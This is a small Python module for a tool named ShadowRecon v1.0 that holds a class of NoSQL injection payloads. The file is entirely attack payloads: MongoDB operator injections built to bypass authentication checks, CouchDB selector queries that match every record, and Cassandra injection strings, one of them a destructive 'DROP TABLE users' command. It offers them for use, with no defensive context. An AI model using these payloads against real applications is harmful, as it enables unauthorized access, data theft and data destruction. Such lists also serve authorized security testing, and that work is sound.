"""
NoSQL Injection Payloads for ShadowRecon v1.0
"""

class NoSQLPayloads:
    """NoSQL injection payloads"""

    MONGODB_PAYLOADS = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.username"}',
        '{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
    ]

    COUCHDB_PAYLOADS = [
        '{"selector": {"_id": {"$gt": null}}}',
        '{"selector": {"$or": [{"username": {"$ne": null}}]}}',
    ]

    CASSANDRA_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' OR token(id) > token('') ALLOW FILTERING; --",
    ]

    @classmethod
    def get_nosql_payloads(cls):
        return cls.MONGODB_PAYLOADS + cls.COUCHDB_PAYLOADS + cls.CASSANDRA_PAYLOADS
